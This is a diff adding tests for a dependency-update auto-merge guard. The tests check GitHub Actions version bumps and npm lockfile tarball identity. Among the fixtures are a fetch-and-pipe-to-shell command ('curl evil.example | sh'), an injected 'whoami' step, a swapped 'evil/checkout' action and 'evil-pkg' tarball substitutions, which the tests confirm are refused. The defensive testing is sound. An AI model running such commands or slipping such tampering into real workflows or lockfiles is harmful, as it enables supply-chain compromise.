@@ -3,9 +3,11 @@ import { describe, expect, it } from "vitest";
 import {
   allowedPathsFor,
   classifyVersionChange,
+  actionVersion,
   collectResolvedUrls,
   deriveLockfileUpdates,
   deriveManifestUpdates,
+  deriveWorkflowUpdates,
   evaluateChangedFiles,
   evaluateChecks,
   evaluateLockfileChanges,
@@ -13,7 +15,9 @@ import {
   evaluatePullRequest,
   evaluateReviews,
   evaluateUpdates,
+  evaluateWorkflowChanges,
   identifySource,
+  resolvedUrlMatchesPackage,
   parseDependabotUpdates,
   parseSnykUpdate,
   preflight,
@@ -725,9 +729,13 @@ function fakeGithub(state: any) {
         getCombinedStatusForRef: async () => ({
           data: { statuses: state.statuses || [] },
         }),
-        getContent: async ({ path, ref }: any) => ({
-          data: JSON.stringify(state.contents?.[`${ref}:${path}`] ?? null),
-        }),
+        getContent: async ({ path, ref }: any) => {
+          const content = state.contents?.[`${ref}:${path}`] ?? null;
+          return {
+            data:
+              typeof content === "string" ? content : JSON.stringify(content),
+          };
+        },
       },
       issues: {
         createComment: async (params: any) => {
@@ -1081,5 +1089,250 @@ describe("policy is derived from the diff, not from what the pull request claims
     await run({ github, context: CONTEXT, core: CORE });
 
     expect(calls.merges).toHaveLength(0);
+  });
+});
+
+const WORKFLOW = `name: Tests
+on: [pull_request]
+
+jobs:
+  unit-tests:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1 (tag v5)
+      - uses: actions/setup-node@abcdef1234567890abcdef1234567890abcdef12 # v4.1.0 (tag v4)
+      - run: npm ci
+      - run: npm run test:unit:run
+`;
+
+const ACTION_BUMP_COMMIT = `build(deps): bump actions/checkout from 5.0.1 to 5.0.2
+
+Bumps [actions/checkout](https://github.com/actions/checkout) from 5.0.1 to 5.0.2.
+
+---
+updated-dependencies:
+- dependency-name: actions/checkout
+  dependency-version: 5.0.2
+  dependency-type: direct:production
+...
+
+Signed-off-by: dependabot[bot] <support@github.com>`;
+
+function bumpCheckout(workflow: string, version: string) {
+  return workflow.replace(
+    "93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1 (tag v5)",
+    `1111111111111111111111111111111111111111 # v${version} (tag v5)`,
+  );
+}
+
+function actionsPull(overrides: any = {}) {
+  return pull({
+    number: 730,
+    title: "build(deps): bump actions/checkout from 5.0.1 to 5.0.2",
+    head: {
+      ref: "dependabot/github_actions/actions/checkout-5.0.2",
+      sha: "headsha1",
+      repo: { fork: false },
+    },
+    ...overrides,
+  });
+}
+
+describe("workflow updates", () => {
+  it("reads the version from a tag or from the comment on a SHA pin", () => {
+    expect(actionVersion({ ref: "v5.0.1", comment: "" })).toBe("v5.0.1");
+    expect(
+      actionVersion({ ref: "93cb6efe1820", comment: " # v5.0.1 (tag v5)" }),
+    ).toBe("v5.0.1");
+    expect(actionVersion({ ref: "93cb6efe1820", comment: "" })).toBeNull();
+  });
+
+  it("accepts a reference bump", () => {
+    expect(
+      deriveWorkflowUpdates(WORKFLOW, bumpCheckout(WORKFLOW, "5.0.2")),
+    ).toEqual({
+      updates: [
+        {
+          name: "actions/checkout",
+          fromVersion: "v5.0.1",
+          toVersion: "v5.0.2",
+          dependencyType: "github-action",
+          removed: false,
+        },
+      ],
+    });
+  });
+
+  it("refuses an edit to anything that is not an action reference", () => {
+    const tampered = WORKFLOW.replace(
+      "npm run test:unit:run",
+      "curl evil.example | sh",
+    );
+    expect(deriveWorkflowUpdates(WORKFLOW, tampered).problem).toContain(
+      "not an action reference",
+    );
+  });
+
+  it("refuses a swapped action, added lines and an unreadable side", () => {
+    expect(
+      deriveWorkflowUpdates(
+        WORKFLOW,
+        WORKFLOW.replace("actions/checkout", "evil/checkout"),
+      ).problem,
+    ).toContain("swaps the action");
+    expect(
+      deriveWorkflowUpdates(WORKFLOW, WORKFLOW + "      - run: whoami\n")
+        .problem,
+    ).toContain("adds or removes lines");
+    expect(deriveWorkflowUpdates(null, WORKFLOW).problem).toContain(
+      "could not be read",
+    );
+  });
+
+  it("applies the action policy to the reference that actually moved", () => {
+    const changes = (version: string) => [
+      {
+        path: ".github/workflows/tests.yml",
+        baseText: WORKFLOW,
+        headText: bumpCheckout(WORKFLOW, version),
+      },
+    ];
+    const declared = ["actions/checkout"];
+
+    expect(evaluateWorkflowChanges(changes("5.0.2"), declared).safe).toBe(true);
+    expect(evaluateWorkflowChanges(changes("5.1.0"), declared).safe).toBe(true);
+
+    const major = evaluateWorkflowChanges(changes("6.0.0"), declared);
+    expect(major.safe).toBe(false);
+    expect(major.reason).toContain("major");
+  });
+
+  it("refuses an action the pull request never declared", () => {
+    const changes = [
+      {
+        path: ".github/workflows/tests.yml",
+        baseText: WORKFLOW,
+        headText: WORKFLOW.replace("# v4.1.0 (tag v4)", "# v4.2.0 (tag v4)"),
+      },
+    ];
+    const result = evaluateWorkflowChanges(changes, ["actions/checkout"]);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("actions/setup-node");
+  });
+
+  it("merges an action bump but not a workflow edit riding on the same trailer", async () => {
+    const state = (headText: string) => ({
+      pull: actionsPull(),
+      files: [".github/workflows/tests.yml"],
+      commits: [ACTION_BUMP_COMMIT],
+      contents: {
+        "basesha1:.github/workflows/tests.yml": WORKFLOW,
+        "headsha1:.github/workflows/tests.yml": headText,
+      },
+    });
+
+    const clean = fakeGithub(state(bumpCheckout(WORKFLOW, "5.0.2")));
+    await run({ github: clean.github, context: CONTEXT, core: CORE });
+    expect(clean.calls.merges).toHaveLength(1);
+
+    // Same patch-sized trailer, but a command has been swapped underneath it.
+    const tampered = fakeGithub(
+      state(
+        bumpCheckout(WORKFLOW, "5.0.2").replace(
+          "npm run test:unit:run",
+          "curl evil.example | sh",
+        ),
+      ),
+    );
+    await run({ github: tampered.github, context: CONTEXT, core: CORE });
+    expect(tampered.calls.merges).toHaveLength(0);
+  });
+});
+
+describe("registry tarball identity", () => {
+  const entry = (overrides: any = {}) => ({
+    version: "1.8.3",
+    resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
+    integrity: "sha512-new",
+    ...overrides,
+  });
+
+  it("accepts a tarball that matches the package and version", () => {
+    expect(resolvedUrlMatchesPackage("node_modules/axios", entry())).toBe(true);
+  });
+
+  it("accepts a scoped package and an aliased entry", () => {
+    expect(
+      resolvedUrlMatchesPackage("node_modules/@vitest/spy", {
+        version: "4.1.11",
+        resolved: "https://registry.npmjs.org/@vitest/spy/-/spy-4.1.11.tgz",
+      }),
+    ).toBe(true);
+    expect(
+      resolvedUrlMatchesPackage("node_modules/my-alias", {
+        name: "axios",
+        version: "1.8.3",
+        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
+      }),
+    ).toBe(true);
+  });
+
+  it("rejects another package's tarball and a mismatched version", () => {
+    expect(
+      resolvedUrlMatchesPackage(
+        "node_modules/axios",
+        entry({
+          resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
+        }),
+      ),
+    ).toBe(false);
+    expect(
+      resolvedUrlMatchesPackage(
+        "node_modules/axios",
+        entry({
+          resolved: "https://registry.npmjs.org/axios/-/axios-0.27.2.tgz",
+        }),
+      ),
+    ).toBe(false);
+  });
+
+  it("rejects substituting a tarball while keeping the version", () => {
+    const head = lockfile({
+      "node_modules/axios": {
+        version: "1.8.2",
+        resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
+        integrity: "sha512-substituted",
+      },
+    });
+    const result = evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("without changing its version");
+  });
+
+  it("rejects a new entry pointing at a different package's tarball", () => {
+    const head = lockfile({
+      ...BASE_LOCK.packages,
+      "node_modules/left-pad": {
+        version: "1.3.0",
+        resolved: "https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz",
+        integrity: "sha512-x",
+      },
+    });
+    const result = evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("not that package at 1.3.0");
+  });
+
+  it("still accepts an ordinary upgrade", () => {
+    const head = lockfile({
+      "node_modules/axios": {
+        version: "1.8.3",
+        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
+        integrity: "sha512-new",
+      },
+    });
+    expect(evaluateLockfileChanges(BASE_LOCK, head, BASE_MANIFEST).safe).toBe(
+      true,
+    );
   });
 });
